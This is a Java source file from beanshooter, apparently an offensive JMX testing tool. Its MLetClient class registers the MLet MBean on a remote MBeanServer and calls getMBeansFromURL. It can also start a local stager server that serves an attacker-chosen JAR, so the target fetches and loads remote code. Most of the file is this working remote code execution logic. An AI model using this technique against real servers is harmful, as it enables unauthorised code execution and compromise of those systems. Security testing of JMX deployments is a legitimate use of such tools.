package de.qtc.beanshooter.operation;

import java.io.IOException;
import java.net.URL;

import javax.management.InstanceNotFoundException;
import javax.management.MBeanException;
import javax.management.MalformedObjectNameException;
import javax.management.ObjectName;
import javax.management.ReflectionException;

import de.qtc.beanshooter.cli.Option;
import de.qtc.beanshooter.exceptions.ExceptionHandler;
import de.qtc.beanshooter.io.Logger;
import de.qtc.beanshooter.networking.StagerServer;
import de.qtc.beanshooter.utils.Constant;
import de.qtc.beanshooter.utils.Utils;

/**
 * The MLetClient class implements methods to communicate with the MLet MBean.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class MLetClient {

    private boolean registered;
    private final ObjectName objName;
    private final MBeanServerClient conn;

    /**
     * Initializes the MLetClient with an MBeanServerConnection.
     *
     * @param conn connection to an remote MBeanServer
     */
    public MLetClient(MBeanServerClient conn)
    {
        this.conn = conn;
        this.registered = false;
        this.objName = Utils.getObjectName(Constant.JMX_MLET_NAME.value);
    }

    /**
     * Cleanup the MLetClient. This causes the MLet MBean to be removed from the server if it was
     * deployed through this class.
     */
    public void finalize()
    {
        if( this.registered )
            conn.unregisterMBean(null);
    }

    /**
     * Register the MLet MBean on the remote MBeanServer. If the MLet MBean is not present and was
     * deployed through this function, we set the registered attribute to true. This will cause a
     * cleanup action to be performed when the object is no longer used.
     */
    public void registerMLet()
    {
        if( conn.isRegistered(objName) )
            return;

        conn.deployMBean(Constant.JMX_MLET_CLASS.value, null, false);
        this.registered = true;
    }

    /**
     * Implements the logic to load an MBean from a user specified URL. If the user specified
     * URL is local, the protocol is HTTP and the --no-stager option was not specified, the function
     * also launches a StagerServer on the specified URL.
     *
     * @param mBeanClassName class that is implemented by the MBean
     * @param mBeanObjectName objectName of the MBean
     * @param url URL to load the MBean from
     */
    public void loadMBeanFromURL(String mBeanClassName, ObjectName mBeanObjectName, String urlString)
    {
        this.registerMLet();
        URL url = Utils.parseUrl(urlString);

        int port = url.getPort();
        String host = url.getHost();
        String protocol = url.getProtocol();

        Logger.printlnMixedBlue("Loading MBean from", urlString);
        Logger.lineBreak();
        Logger.increaseIndent();

        if( !Option.DEPLOY_NO_STAGER.getBool() && protocol.equals("http") && Utils.isLocal(host) )
        {
            StagerServer server = new StagerServer(host, port, false);
            server.start(urlString, Option.DEPLOY_JAR_FILE.getValue() ,mBeanClassName, mBeanObjectName.toString());
        }

        try {
            conn.invoke(new ObjectName(Constant.JMX_MLET_NAME.value), "getMBeansFromURL", url);

        } catch (InstanceNotFoundException | MalformedObjectNameException | MBeanException | ReflectionException
                | IOException e) {
            ExceptionHandler.unexpectedException(e, "loading", "MBean", true);

        } finally {
            Logger.decreaseIndent();
        }
    }
}
